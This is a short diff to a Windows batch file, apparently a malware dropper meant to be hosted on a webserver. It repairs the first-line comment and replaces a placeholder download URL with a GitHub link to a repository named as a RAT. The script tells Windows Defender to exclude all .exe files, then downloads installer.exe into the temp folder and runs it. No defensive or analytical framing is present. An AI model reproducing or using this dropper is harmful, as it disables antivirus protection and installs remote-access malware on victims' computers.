@@ -1,4 +1,4 @@
-ÿþM - This is not the file you need to run. You need to upload this file to your webserver.
+REM - This is not the file you need to run. You need to upload this file to your webserver.
 
 @echo off
 
@@ -28,5 +28,5 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe"
+Powershell -Command "Invoke-Webrequest 'https://github.com/imaeewy/test-rat-do-not-download-exe/raw/refs/heads/main/installer.exe' -OutFile installer.exe"
 installer.exe
